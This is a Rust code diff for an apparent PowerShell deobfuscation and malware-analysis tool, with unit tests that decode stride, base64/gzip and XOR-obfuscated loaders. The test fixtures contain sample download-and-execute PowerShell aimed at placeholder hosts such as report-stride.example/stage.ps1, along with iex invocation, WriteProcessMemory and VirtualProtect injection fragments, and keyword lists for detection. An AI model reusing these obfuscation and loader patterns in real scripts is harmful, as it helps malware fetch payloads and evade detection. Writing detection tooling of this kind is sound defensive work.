         && !contains_ascii_case_insensitive(text, "-n")
@@ -6051,12 +7022,279 @@ fn expand_skip_nth(text: &str) -> String {
 
 #[cfg(test)]
 mod skip_nth_prefilter_tests {
-    use super::expand_skip_nth;
+    use super::{
+        expand_for_substring_stride_fast_path_payload, expand_skip_nth,
+        large_ps1_report_sample_needs_normalization, looks_like_for_substring_stride_payload,
+        normalize_ps1_payload_for_report_until,
+    };
 
     #[test]
     fn ignores_text_without_skip_nth_shape() {
         let text = "Write-Host hello world";
         assert_eq!(expand_skip_nth(text), text);
+    }
+
+    #[test]
+    fn dense_skip_nth_report_normalization_uses_fast_path() {
+        fn carrier(decoded: &str) -> String {
+            decoded.chars().flat_map(|ch| ['x', 'x', ch]).collect()
+        }
+
+        let mut text = String::from(
+            "function Decode($s){$i=2;do{$o+=$s[$i];Format-List;$i+=3}until(!$s[$i])$o}",
+        );
+        for _ in 0..10 {
+            text.push_str(";IEX (Decode '");
+            text.push_str(&carrier("Invoke-WebRequest https://fast.example/p"));
+            text.push_str("')");
+        }
+
+        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(text.as_bytes(), None);
+
+        assert!(!timed_out);
+        assert!(
+            normalized.contains("https://fast.example/p"),
+            "{normalized}"
+        );
+    }
+
+    #[test]
+    fn dense_do_until_stride_report_normalization_decodes_variable_carrier() {
+        let mut text = String::from(
+            "$vibr='~~~[~~~n.~~E~~~T ~~. ~~s~~~e ~~R~,~V~~~I ~~C~~~E~';\
+             function Ekser ($gerlin) {$ashrames=3;\
+             do {$unde+=$gerlin[$ashrames];$ashrames+=4;$x=Compare-Object a b}\
+             until (!$gerlin[$ashrames])$unde};",
+        );
+        for _ in 0..60 {
+            text.push_str("Rockl (Ekser $vibr);");
+        }
+
+        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(text.as_bytes(), None);
+
+        assert!(!timed_out);
+        assert!(
+            normalized.contains("'[nET.seRVICE'"),
+            "dense report normalization did not rewrite variable carrier:\n{normalized}"
+        );
+    }
+
+    #[test]
+    fn direct_index_for_stride_payload_uses_fast_path_gate_without_literal_invoke() {
+        fn carrier(decoded: &str) -> String {
+            decoded
+                .chars()
+                .flat_map(|ch| ['x', 'x', 'x', 'x', ch])
+                .collect()
+        }
+
+        let decoded = "Invoke-WebRequest https://stride-fast.example/p -OutFile out.bin";
+        let encoded = carrier(decoded);
+        let mut text = String::from(
+            "function Decode($s){for($i=4;$i -lt $s.Length;$i+=5){$out+=$s[$i];$noise='x'}$out};",
+        );
+        for _ in 0..18 {
+            text.push_str("Run (Decode '");
+            text.push_str(&encoded);
+            text.push_str("');");
+        }
+
+        assert!(
+            looks_like_for_substring_stride_payload(&text),
+            "direct index stride decoder should be eligible for the fast path"
+        );
+
+        let expanded = expand_for_substring_stride_fast_path_payload(&text);
+        assert!(
+            expanded.contains("https://stride-fast.example/p"),
+            "fast path did not decode direct index-stride carriers:\n{expanded}"
+        );
+    }
+
+    #[test]
+    fn report_fast_path_decodes_appended_substring_method_stride() {
+        fn carrier(decoded: &str, start: usize, step: usize) -> String {
+            let len = start + decoded.chars().count() * step;
+            let mut chars = vec!['x'; len];
+            for (idx, c) in decoded.chars().enumerate() {
+                chars[start + idx * step] = c;
+            }
+            chars.into_iter().collect()
+        }
+
+        let decoded =
+            "Invoke-WebRequest https://report-stride.example/stage.ps1 -OutFile stage.ps1";
+        let carrier = carrier(decoded, 4, 5);
+        let ps = format!(
+            "$method='S';$method+='ubstrin';$method+='g';\
+             function Decode($s){{for($i=4;$i -lt $s.Length;$i+=(5)){{$out+=$s.$method.Invoke($i,1);}}$out}};\
+             $url=Decode '{carrier}';\
+             $pad='{pad}'",
+            pad = "x".repeat(1024)
+        );
+
+        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(ps.as_bytes(), None);
+
+        assert!(!timed_out);
+        assert!(
+            normalized.contains("https://report-stride.example/stage.ps1"),
+            "report fast path did not decode appended method stride:\n{normalized}"
+        );
+    }
+
+    #[test]
+    fn report_fast_path_decodes_concat_substring_method_stride() {
+        fn carrier(decoded: &str, start: usize, step: usize) -> String {
+            let len = start + decoded.chars().count() * step;
+            let mut chars = vec!['x'; len];
+            for (idx, c) in decoded.chars().enumerate() {
+                chars[start + idx * step] = c;
+            }
+            chars.into_iter().collect()
+        }
+
+        let decoded = "Invoke-WebRequest http://report-stride.example/next.ps1";
+        let carrier = carrier(decoded, 5, 6);
+        let ps = format!(
+            "$prefix='S';$suffix='ring';$method=$prefix+'ubst'+$suffix;\
+             function Decode($s){{for($i=5;$i -lt $s.Length;$i+=6){{$out+=$s.$method.Invoke($i,1);}}$out}};\
+             Decode '{carrier}';\
+             $pad='{pad}'",
+            pad = "x".repeat(1024)
+        );
+
+        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(ps.as_bytes(), None);
+
+        assert!(!timed_out);
+        assert!(
+            normalized.contains("http://report-stride.example/next.ps1"),
+            "report fast path did not decode concat method stride:\n{normalized}"
+        );
+    }
+
+    #[test]
+    fn near_threshold_large_base64_ps1_report_normalization_is_sampled() {
+        let mut text = String::from("$combinedData = [Convert]::FromBase64String(\"");
+        text.push_str(&"A".repeat(112 * 1024));
+        text.push_str(
+            r#"" )
+$key = [System.Security.Cryptography.SHA256]::Create()
+$plain = $aes.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
+[Kernel32]::WriteProcessMemory($proc, $addr, $plain, $plain.Length, [IntPtr]::Zero)
+"#,
+        );
+        assert!(text.len() > 96 * 1024 && text.len() < 128 * 1024);
+
+        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(text.as_bytes(), None);
+
+        assert!(!timed_out);
+        assert!(
+            normalized.contains("omitted middle of large extracted PowerShell payload"),
+            "near-threshold large PS1 payload was fully normalized instead of sampled"
+        );
+        assert!(normalized.contains("FromBase64String"));
+        assert!(normalized.contains("WriteProcessMemory"));
+    }
+
+    #[test]
+    fn large_gzip_function_stage_decodes_before_report_sampling(
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        use base64::Engine;
+        use std::io::Write;
+
+        let mut filler = String::with_capacity(120 * 1024);
+        let mut state = 0x1234_5678u32;
+        for _ in 0..120 * 1024 {
+            state = state.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
+            filler.push((b'!' + (state % 90) as u8) as char);
+        }
+        let decoded = format!(
+            "Invoke-WebRequest -Uri https://large-gzip-stage.example/stage.ps1\r\n\
+             $noise = '{filler}'\r\n\
+             Add-Type '[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect();'\r\n"
+        );
+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes())?;
+        let gz = encoder.finish()?;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
+        assert!(
+            b64.len() > 96 * 1024,
+            "test fixture should force the large-report path"
+        );
+        let ps = format!(
+            r#"
+$blob = "{b64}"
+function InflateBytes ([byte[]]$bytes) {{
+    $inputStream = [IO.MemoryStream]::new($bytes)
+    $gzipStream = [IO.Compression.GZipStream]::new($inputStream, [IO.Compression.CompressionMode]::Decompress)
+    $outputStream = [IO.MemoryStream]::new()
+    $gzipStream.CopyTo($outputStream)
+    $outputStream.ToArray()
+}}
+$stage = [Text.Encoding]::UTF8.GetString((InflateBytes ([Convert]::FromBase64String($blob)))).TrimEnd("`0")
+iex $stage
+"#
+        );
+
+        let (normalized, timed_out) = normalize_ps1_payload_for_report_until(ps.as_bytes(), None);
+
+        assert!(!timed_out);
+        assert!(
+            normalized.contains("https://large-gzip-stage.example/stage.ps1"),
+            "large gzip stage was not decoded before sampling:\n{normalized}"
+        );
+        assert!(
+            normalized.contains("DllImport"),
+            "tail of decoded stage was not preserved by sampling:\n{normalized}"
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "report should not expose the compressed wrapper as the primary layer:\n{normalized}"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn large_plain_loader_tokens_do_not_force_report_normalization() {
+        let text = r#"
+$computer = $env:COMPUTERNAME
+$payload = [Convert]::FromBase64String("QUJDREVGR0g=")
+[System.Environment]::GetEnvironmentVariable("TEMP")
+Start-Sleep -Seconds 5
+"#;
+
+        assert!(
+            !large_ps1_report_sample_needs_normalization(text),
+            "plain loader/environment tokens should not require full PS normalization"
+        );
+    }
+
+    #[test]
+    fn large_plain_loader_base64_iex_substring_is_not_invoke_expression() {
+        let text = r#"
+$payload = [Convert]::FromBase64String("AAAiexAAAiexAAAiexAAA=")
+[Kernel32]::WriteProcessMemory($proc, $addr, $payload, $payload.Length, [IntPtr]::Zero)
+"#;
+
+        assert!(
+            !large_ps1_report_sample_needs_normalization(text),
+            "iex inside opaque data should not require full PS normalization"
+        );
+    }
+
+    #[test]
+    fn large_obfuscated_loader_tokens_still_force_report_normalization() {
+        for text in [
+            r#"$x = "AxxB" -replace "xx", "" "#,
+            r#"$x = ([char]73)+([char]69)+([char]88)"#,
+            r#"$x = $s.substring(1, 3)"#,
+            r#"$x = "a","b" -join "" "#,
+        ] {
+            assert!(
+                large_ps1_report_sample_needs_normalization(text),
+                "obfuscated PS sample should require normalization: {text}"
+            );
+        }
     }
 }
 
@@ -6134,62 +7372,71 @@ fn expand_skip_nth_for_substring(text: &str) -> String {
                 Some((name, start, step))
             }),
     );
-    defs.extend(
-        FOR_INDEX_STRIDE_DEF_RE
-            .captures_iter(text)
-            .filter_map(|caps| {
-                let name = caps.get(1)?.as_str().to_string();
-                let param_var = caps.get(2)?.as_str();
-                let init_var = caps.get(3)?.as_str();
-                let inc_var = caps.get(5)?.as_str();
-                let body_param = caps.get(7)?.as_str();
-                let body_idx = caps.get(8)?.as_str();
-                if !init_var.eq_ignore_ascii_case(inc_var)
-                    || !init_var.eq_ignore_ascii_case(body_idx)
-                    || !param_var.eq_ignore_ascii_case(body_param)
-                {
-                    return None;
-                }
-                let start: usize = caps.get(4)?.as_str().parse().ok()?;
-                let step: usize = caps.get(6)?.as_str().parse().ok()?;
-                if start > 10 || step == 0 || step > 10 {
-                    return None;
-                }
-                Some((name, start, step))
-            }),
-    );
+    let has_for_stride_loop = contains_ascii_case_insensitive(text, "for(")
+        || contains_ascii_case_insensitive(text, "for (");
+    if has_for_stride_loop {
+        defs.extend(
+            FOR_INDEX_STRIDE_DEF_RE
+                .captures_iter(text)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str().to_string();
+                    let param_var = caps.get(2)?.as_str();
+                    let init_var = caps.get(3)?.as_str();
+                    let inc_var = caps.get(5)?.as_str();
+                    let body_param = caps.get(7)?.as_str();
+                    let body_idx = caps.get(8)?.as_str();
+                    if !init_var.eq_ignore_ascii_case(inc_var)
+                        || !init_var.eq_ignore_ascii_case(body_idx)
+                        || !param_var.eq_ignore_ascii_case(body_param)
+                    {
+                        return None;
+                    }
+                    let start: usize = caps.get(4)?.as_str().parse().ok()?;
+                    let step: usize = caps.get(6)?.as_str().parse().ok()?;
+                    if start > 10 || step == 0 || step > 10 {
+                        return None;
+                    }
+                    Some((name, start, step))
+                }),
+        );
+    }
     let bindings = ps_string_bindings(text);
-    defs.extend(
-        FOR_SUBSTRING_INVOKE_STRIDE_DEF_RE
-            .captures_iter(text)
-            .filter_map(|caps| {
-                let name = caps.get(1)?.as_str().to_string();
-                let param_var = caps.get(2)?.as_str();
-                let init_var = caps.get(3)?.as_str();
-                let inc_var = caps.get(5)?.as_str();
-                let body_param = caps.get(7)?.as_str();
-                let body_idx = caps.get(10)?.as_str();
-                if !init_var.eq_ignore_ascii_case(inc_var)
-                    || !init_var.eq_ignore_ascii_case(body_idx)
-                    || !param_var.eq_ignore_ascii_case(body_param)
-                {
-                    return None;
-                }
-                let method = caps.get(8).map(|m| m.as_str().to_string()).or_else(|| {
-                    caps.get(9)
-                        .and_then(|m| bindings.get(&m.as_str().to_ascii_lowercase()).cloned())
-                })?;
-                if !method.eq_ignore_ascii_case("substring") {
-                    return None;
-                }
-                let start: usize = caps.get(4)?.as_str().parse().ok()?;
-                let step: usize = caps.get(6)?.as_str().parse().ok()?;
-                if start > 10 || step == 0 || step > 10 {
-                    return None;
-                }
-                Some((name, start, step))
-            }),
-    );
+    if has_for_stride_loop {
+        defs.extend(
+            FOR_SUBSTRING_INVOKE_STRIDE_DEF_RE
+                .captures_iter(text)
+                .filter_map(|caps| {
+                    let name = caps.get(1)?.as_str().to_string();
+                    let param_var = caps.get(2)?.as_str();
+                    let init_var = caps.get(3)?.as_str();
+                    let inc_var = caps.get(5)?.as_str();
+                    let body_param = caps.get(7)?.as_str();
+                    let body_idx = caps.get(10)?.as_str();
+                    if !init_var.eq_ignore_ascii_case(inc_var)
+                        || !init_var.eq_ignore_ascii_case(body_idx)
+                        || !param_var.eq_ignore_ascii_case(body_param)
+                    {
+                        return None;
+                    }
+                    let method = caps.get(8).map(|m| m.as_str().to_string()).or_else(|| {
+                        caps.get(9)
+                            .and_then(|m| bindings.get(&m.as_str().to_ascii_lowercase()).cloned())
+                    })?;
+                    if !method.eq_ignore_ascii_case("substring") {
+                        return None;
+                    }
+                    let start: usize = caps.get(4)?.as_str().parse().ok()?;
+                    let step: usize = caps.get(6)?.as_str().parse().ok()?;
+                    if start > 10 || step == 0 || step > 10 {
+                        return None;
+                    }
+                    Some((name, start, step))
+                }),
+        );
+    }
+
+    let mut seen_defs = std::collections::HashSet::new();
+    defs.retain(|(name, start, step)| seen_defs.insert((name.to_ascii_lowercase(), *start, *step)));
 
     for (name, start, step) in defs {
         // Accept both NAME 'carrier' and NAME('carrier') / NAME ( 'carrier' ).
@@ -6225,6 +7472,42 @@ fn expand_skip_nth_for_substring(text: &str) -> String {
             })
             .collect();
         for (start_pos, end_pos, replacement) in call_matches.into_iter().rev() {
+            out.replace_range(start_pos..end_pos, &replacement);
+        }
+
+        let var_call_re_str = format!(
+            r#"(?i)(?:^|[^\w]){}\s*\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?"#,
+            regex::escape(&name)
+        );
+        let Ok(var_call_re) = regex::Regex::new(&var_call_re_str) else {
+            continue;
+        };
+        let var_call_matches: Vec<(usize, usize, String)> = var_call_re
+            .captures_iter(&out)
+            .filter_map(|cc| {
+                let full = cc.get(0)?;
+                let var = cc.get(1)?.as_str().to_ascii_lowercase();
+                let carrier = bindings.get(&var)?;
+                if carrier.len() > 8192 {
+                    return None;
+                }
+                let raw_match = full.as_str();
+                let name_start = raw_match
+                    .find(|c: char| c.is_alphanumeric() || c == '_')
+                    .unwrap_or(0);
+                let prefix = &raw_match[..name_start];
+                let decoded = decode_strided_carrier(carrier, start, step);
+                if decoded.len() < 3 {
+                    return None;
+                }
+                Some((
+                    full.start(),
+                    full.end(),
+                    format!("{}'{}'", prefix, decoded.replace('\'', "")),
+                ))
+            })
+            .collect();
+        for (start_pos, end_pos, replacement) in var_call_matches.into_iter().rev() {
             out.replace_range(start_pos..end_pos, &replacement);
         }
     }
@@ -6318,6 +7601,31 @@ Pick 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxIxxxxnxxxxvxxxx
             "do/while stride call inside prior function was not rewritten:\n{out}"
         );
     }
+
+    #[test]
+    fn do_while_stride_extractor_variable_carrier_is_rewritten() {
+        let text = concat!(
+            "$vibr='~~~[~~~n.~~E~~~T ~~. ~~s~~~e ~~R~,~V~~~I ~~C~~~E~';",
+            "function Ekser ($gerlin) {",
+            "$ashrames=3;",
+            "do {$unde+=$gerlin[$ashrames];$ashrames+=4;$ashramesmmateria=Compare-Object x y}",
+            "until (!$gerlin[$ashrames])$unde",
+            "};",
+            "$ynglefu=Ekser ' GGnGGGeGGGtGGG.G GW';",
+            "Rockl (Ekser $vibr)"
+        );
+
+        let out = expand_skip_nth_for_substring(text);
+
+        assert!(
+            out.contains("$ynglefu='net.W'"),
+            "direct carrier call was not rewritten:\n{out}"
+        );
+        assert!(
+            out.contains("Rockl ('[nET.seRVICE'"),
+            "variable carrier call was not rewritten:\n{out}"
+        );
+    }
 }
 
 #[cfg(test)]
@@ -6356,22 +7664,37 @@ static PS_VAR_REPLACE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
     .expect("ps var replace assign")
 });
 
+fn ps_deadline_expired(deadline: Option<std::time::Instant>) -> bool {
+    deadline.is_some_and(|deadline| std::time::Instant::now() >= deadline)
+}
+
 /// Pre-pass over a PowerShell text: expand common obfuscation patterns so that
 /// subsequent URL-extraction regexes see literal strings.
-fn expand_obfuscation(text: &str) -> String {
+fn expand_obfuscation_until(text: &str, deadline: Option<std::time::Instant>) -> (String, bool) {
     let mut out = normalize_powershell_quotes(text);
+    out = repair_damaged_webclient_constructor_method(&out);
     let mut skip_nth_for_substring_done = false;
+    let mut keyed_base64_xor_done = false;
     for _ in 0..8 {
+        if ps_deadline_expired(deadline) {
+            return (out, true);
+        }
         let before = out.clone();
         out = expand_start_process_argument_list(&out);
         out = expand_invoke_expression_wrappers(&out);
         out = expand_literal_replace_extractor_calls(&out);
+        if ps_deadline_expired(deadline) {
+            return (out, true);
+        }
         out = expand_literal_substring_extractor_calls(&out);
         out = expand_literal_trim_extractor_calls(&out);
         out = expand_literal_case_extractor_calls(&out);
         out = expand_literal_index_extractor_calls(&out);
         out = expand_literal_remove_extractor_calls(&out);
         out = expand_literal_insert_extractor_calls(&out);
+        if ps_deadline_expired(deadline) {
+            return (out, true);
+        }
         out = expand_passthrough_call_wrappers(&out);
         out = expand_ps_dot_replace(&out);
         out = expand_ps_embedded_single_quote_assignments(&out);
@@ -6380,6 +7703,11 @@ fn expand_obfuscation(text: &str) -> String {
         if !skip_nth_for_substring_done {
             let next = expand_skip_nth_for_substring(&out);
             skip_nth_for_substring_done = next != out;
+            out = next;
+        }
+        if !keyed_base64_xor_done {
+            let next = expand_keyed_base64_xor_string_fragments(&out);
+            keyed_base64_xor_done = next != out;
             out = next;
         }
         out = expand_char_concat(&out);
@@ -6395,6 +7723,9 @@ fn expand_obfuscation(text: &str) -> String {
         out = expand_double_string_concat(&out);
         out = expand_format_literals(&out);
         out = expand_ps_string_format_static(&out);
+        if ps_deadline_expired(deadline) {
+            return (out, true);
+        }
         out = expand_gzip_function_base64_variables(&out);
         out = expand_gzip_base64_literals(&out);
         out = expand_json_script_base64(&out);
@@ -6439,16 +7770,31 @@ fn expand_obfuscation(text: &str) -> String {
             break;
         }
     }
-    out
+    (out, false)
 }
 
-fn expand_obfuscation_with_env(text: &str, env: &Environment) -> String {
-    let expanded = expand_obfuscation(text);
+fn expand_obfuscation_with_env(text: &str, env: &mut Environment) -> String {
+    if env.check_timeout() {
+        return text.to_string();
+    }
+    let (expanded, timed_out) = expand_obfuscation_until(text, env.limits.deadline);
+    if timed_out {
+        env.note_timeout();
+        return expanded;
+    }
+    if env.check_timeout() {
+        return expanded;
+    }
     let env_expanded = expand_ps_env_refs(&expanded, env);
     if env_expanded == expanded {
         expanded
     } else {
-        expand_obfuscation(&env_expanded)
+        let (expanded_again, timed_out) =
+            expand_obfuscation_until(&env_expanded, env.limits.deadline);
+        if timed_out {
+            env.note_timeout();
+        }
+        expanded_again
     }
 }
 
@@ -6469,6 +7815,42 @@ fn normalize_powershell_quotes(text: &str) -> String {
         })
         .collect();
     normalized.replace("\\\"", "\"")
+}
+
+fn repair_damaged_webclient_constructor_method(text: &str) -> String {
+    DAMAGED_WEBCLIENT_CONSTRUCTOR_METHOD_RE
+        .replace_all(text, "$1).$2")
+        .into_owned()
+}
+
+#[cfg(test)]
+mod ps1_report_normalization_tests {
+    use super::normalize_ps1_text;
+
+    #[test]
+    fn normalizes_damaged_webclient_downloadfile_constructor_for_report() {
+        let text = "(New-Object -TypeName System.Net.WebClient.DownloadFile('https://example.test/a.exe', 'C:\\Users\\Public\\a.exe')";
+
+        let normalized = normalize_ps1_text(text);
+
+        assert!(
+            normalized.contains("(New-Object -TypeName System.Net.WebClient).DownloadFile("),
+            "damaged WebClient DownloadFile constructor was not repaired:\n{normalized}"
+        );
+    }
+
+    #[test]
+    fn leaves_regular_webclient_downloadfile_invocation_alone() {
+        let text =
+            "$wc=New-Object Net.WebClient;$wc.DownloadFile('https://example.test/a.exe','a.exe')";
+
+        let normalized = normalize_ps1_text(text);
+
+        assert!(
+            normalized.contains("$wc.DownloadFile('https://example.test/a.exe','a.exe')"),
+            "regular WebClient DownloadFile call should not be rewritten:\n{normalized}"
+        );
+    }
 }
 
 fn strip_marker_noise(text: &str) -> String {
@@ -6492,6 +7874,10 @@ fn should_skip_marker_noise_line(text: &str) -> bool {
     contains_ascii_case_insensitive(text, ".replace(")
         || contains_ascii_case_insensitive(text, "::replace(")
         || contains_ascii_case_insensitive(text, "-replace")
+        || contains_ascii_case_insensitive(text, "http:")
+        || contains_ascii_case_insensitive(text, "https:")
+        || contains_ascii_case_insensitive(text, "ftp:")
+        || contains_ascii_case_insensitive(text, "file:")
         || contains_ascii_case_insensitive(text, "gzipstream")
         || contains_ascii_case_insensitive(text, "readtoend")
         || contains_ascii_case_insensitive(text, "function ")
@@ -6535,15 +7921,197 @@ fn decode_payload(bytes: &[u8]) -> std::borrow::Cow<'_, str> {
     }
 }
 
+#[allow(dead_code)]
 pub fn normalize_ps1_text(text: &str) -> String {
-    let expanded = strip_marker_noise(&expand_obfuscation(&strip_marker_noise(text)));
-    let aliased = crate::ps_alias::expand_aliases_if_ps(&expanded);
-    escape_binary_controls(&aliased)
+    normalize_ps1_text_until(text, None).0
 }
 
+pub(crate) fn normalize_ps1_text_until(
+    text: &str,
+    deadline: Option<std::time::Instant>,
+) -> (String, bool) {
+    let command_text = unwrap_outer_encoded_powershell_argument(text);
+    let decoded_iex_inner = decode_marker_replaced_getstring_iex_inner(&command_text);
+    let normalization_source = decoded_iex_inner.as_deref().unwrap_or(&command_text);
+    let stripped = strip_marker_noise(normalization_source);
+    let (expanded, timed_out) = expand_obfuscation_until(&stripped, deadline);
+    let expanded = strip_marker_noise(&expanded);
+    let aliased = crate::ps_alias::expand_aliases_if_ps(&expanded);
+    let aliased = expand_keyed_base64_xor_string_fragments(&aliased);
+    (
+        escape_binary_controls(&aliased),
+        timed_out || ps_deadline_expired(deadline),
+    )
+}
+
+fn decode_marker_replaced_getstring_iex_inner(text: &str) -> Option<String> {
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("frombase64string")
+        || !lower.contains(".replace(")
+        || !(lower.contains("invoke-expression") || lower.contains("iex"))
+    {
+        return None;
+    }
+    let marker_replaced = expand_ps_dot_replace(text);
+    let decoded = expand_getstring_base64_literals(&marker_replaced);
+    let caps = PS_INVOKE_EXPRESSION_SINGLE_LITERAL_RE.captures(decoded.trim())?;
+    let inner = caps.get(1)?.as_str().replace("''", "'");
+    (inner.trim().len() >= 16).then_some(inner)
+}
+
+fn unwrap_outer_encoded_powershell_argument(text: &str) -> String {
+    let trimmed = text.trim();
+    let Some(inner) = trimmed
+        .strip_prefix('"')
+        .and_then(|value| value.strip_suffix('"'))
+    else {
+        return text.to_string();
+    };
+    let lower = inner.to_ascii_lowercase();
+    if lower.contains("frombase64string")
+        && (lower.contains("invoke-expression") || lower.contains("iex("))
+    {
+        inner.to_string()
+    } else {
+        text.to_string()
+    }
+}
+
+#[allow(dead_code)]
 pub fn normalize_ps1_payload(bytes: &[u8]) -> String {
     let raw_text = decode_payload(bytes);
     normalize_ps1_text(&raw_text)
+}
+
+#[allow(dead_code)]
+pub(crate) fn normalize_ps1_payload_until(
+    bytes: &[u8],
+    deadline: Option<std::time::Instant>,
+) -> (String, bool) {
+    let raw_text = decode_payload(bytes);
+    normalize_ps1_text_until(&raw_text, deadline)
+}
+
+pub(crate) fn normalize_ps1_payload_for_report_until(
+    bytes: &[u8],
+    deadline: Option<std::time::Instant>,
+) -> (String, bool) {
+    let raw_text = decode_payload(bytes);
+    if bytes.len() >= LARGE_PS1_REPORT_FAST_PATH_BYTES
+        && looks_like_deflate_xor_base64_assembly_loader(&raw_text)
+    {
+        return (
+            escape_binary_controls(&head_tail_sample(&raw_text, 48 * 1024)),
+            false,
+        );
+    }
+    if looks_like_dense_skip_nth_payload(&raw_text) {
+        return (expand_dense_skip_nth_payload(&raw_text), false);
+    }
+    if looks_like_for_substring_stride_payload(&raw_text) {
+        return (
+            escape_binary_controls(&expand_for_substring_stride_fast_path_payload(&raw_text)),
+            false,
+        );
+    }
+    if looks_like_keyed_base64_xor_payload(&raw_text) {
+        return (
+            escape_binary_controls(&expand_keyed_base64_xor_payload_fast(&raw_text)),
+            false,
+        );
+    }
+    if bytes.len() >= LARGE_PS1_REPORT_FAST_PATH_BYTES {
+        let (large_text, timed_out) =
+            expand_large_compressed_ps1_stage_before_sampling(&raw_text, deadline);
+        if timed_out {
+            return (escape_binary_controls(&large_text), true);
+        }
+        let sampled = head_tail_sample(&large_text, 48 * 1024);
+        if large_ps1_report_sample_needs_normalization(&sampled) {
+            normalize_ps1_text_until(&sampled, deadline)
+        } else {
+            (
+                escape_binary_controls(&sampled),
+                ps_deadline_expired(deadline),
+            )
+        }
+    } else {
+        normalize_ps1_text_until(&raw_text, deadline)
+    }
+}
+
+fn expand_dense_skip_nth_payload(text: &str) -> String {
+    let expanded = expand_skip_nth(text);
+    let expanded = expand_skip_nth_for_substring(&expanded);
+    let expanded = expand_ps_variables(&expanded);
+    let expanded = expand_skip_nth_for_substring(&expanded);
+    let expanded = expand_ps_variables(&expanded);
+    expand_keyed_base64_xor_string_fragments(&expanded)
+}
+
+fn expand_for_substring_stride_fast_path_payload(text: &str) -> String {
+    let expanded = expand_skip_nth(text);
+    let expanded = expand_skip_nth_for_substring(&expanded);
+    let expanded = expand_ps_variables(&expanded);
+    let expanded = expand_skip_nth_for_substring(&expanded);
+    let expanded = expand_ps_variables(&expanded);
+    expand_keyed_base64_xor_string_fragments(&expanded)
+}
+
+fn large_ps1_report_sample_needs_normalization(text: &str) -> bool {
+    if [
+        "-replace",
+        ".replace(",
+        "::replace(",
+        "gzipstream",
+        "invoke-expression",
+        "[char",
+        "-join",
+        ".substring(",
+        "-bxor",
+    ]
+    .iter()
+    .any(|needle| crate::util::contains_ascii_case_insensitive(text, needle))
+    {
+        return true;
+    }
+
+    contains_ps_command_token_ascii_case_insensitive(text, "iex")
+}
+
+fn contains_ps_command_token_ascii_case_insensitive(text: &str, token: &str) -> bool {
+    let haystack = text.as_bytes();
+    let needle = token.as_bytes();
+    if needle.is_empty() || haystack.len() < needle.len() {
+        return false;
+    }
+    for start in 0..=haystack.len() - needle.len() {
+        if !haystack[start..start + needle.len()].eq_ignore_ascii_case(needle) {
+            continue;
+        }
+        let before = start
+            .checked_sub(1)
+            .and_then(|idx| haystack.get(idx).copied());
+        let after = haystack.get(start + needle.len()).copied();
+        if ps_token_boundary_before(before) && ps_token_boundary_after(after) {
+            return true;
+        }
+    }
+    false
+}
+
+fn ps_token_boundary_before(byte: Option<u8>) -> bool {
+    match byte {
+        None => true,
+        Some(b) => !b.is_ascii_alphanumeric() && !matches!(b, b'_' | b'-' | b'$'),
+    }
+}
+
+fn ps_token_boundary_after(byte: Option<u8>) -> bool {
+    match byte {
+        None => true,
+        Some(b) => !b.is_ascii_alphanumeric() && !matches!(b, b'_' | b'-'),
+    }
 }
 
 fn escape_binary_controls(text: &str) -> String {
@@ -6632,7 +8200,9 @@ pub fn extract_self_embedded_ps1(env: &mut Environment, deobfuscated: &str) {
         }
     }
 
-    env.all_extracted_ps1.extend(decoded_payloads);
+    for payload in decoded_payloads {
+        env.push_extracted_ps1(payload);
+    }
     extract_file_backed_xor_ps1(env, deobfuscated);
     scan_file_backed_base64_ps1(deobfuscated, env, deobfuscated);
 }
@@ -6732,7 +8302,7 @@ fn extract_sorted_comment_ps1(env: &mut Environment, input_bytes: &[u8]) {
             continue;
         }
         if known.insert(payload.clone()) {
-            env.all_extracted_ps1.push(payload);
+            env.push_extracted_ps1(payload);
         }
     }
 }
@@ -6812,7 +8382,9 @@ fn extract_file_backed_xor_ps1(env: &mut Environment, deobfuscated: &str) {
         }
     }
 
-    env.all_extracted_ps1.extend(decoded_payloads);
+    for payload in decoded_payloads {
+        env.push_extracted_ps1(payload);
+    }
 }
 
 fn scan_file_backed_base64_ps1(text: &str, env: &mut Environment, deobfuscated: &str) {
@@ -6871,7 +8443,9 @@ fn scan_file_backed_base64_ps1(text: &str, env: &mut Environment, deobfuscated: 
         }
     }
 
-    env.all_extracted_ps1.extend(decoded_payloads);
+    for payload in decoded_payloads {
+        env.push_extracted_ps1(payload);
+    }
 }
 
 fn ps_path_bindings(text: &str, env: &Environment) -> std::collections::HashMap<String, String> {
@@ -6898,7 +8472,7 @@ fn expand_ps_env_path(value: &str, env: &Environment) -> String {
     out
 }
 
-fn expand_ps_env_refs(text: &str, env: &Environment) -> String {
+pub(crate) fn expand_ps_env_refs(text: &str, env: &Environment) -> String {
     if env.vars_iter().next().is_none() || !contains_ascii_case_insensitive(text, "$env:") {
         return text.to_string();
     }
@@ -7243,6 +8817,21 @@ fn dynamic_download_invoke_urls(text: &str) -> Vec<String> {
         std::collections::HashMap::new();
     let mut array_bindings: std::collections::HashMap<String, Vec<String>> =
         std::collections::HashMap::new();
+    let mut string_bindings: std::collections::HashMap<String, String> =
+        std::collections::HashMap::new();
+
+    for caps in PS_ANY_STRING_ASSIGN_RE.captures_iter(text) {
+        let Some(var) = caps.get(1) else {
+            continue;
+        };
+        let Some(value) = caps.get(2).or_else(|| caps.get(3)) else {
+            continue;
+        };
+        string_bindings.insert(
+            var.as_str().to_ascii_lowercase(),
+            value.as_str().to_string(),
+        );
+    }
 
     for caps in PS_ARRAY_LITERAL_ASSIGN_RE.captures_iter(text) {
         let Some(var) = caps.get(1) else {
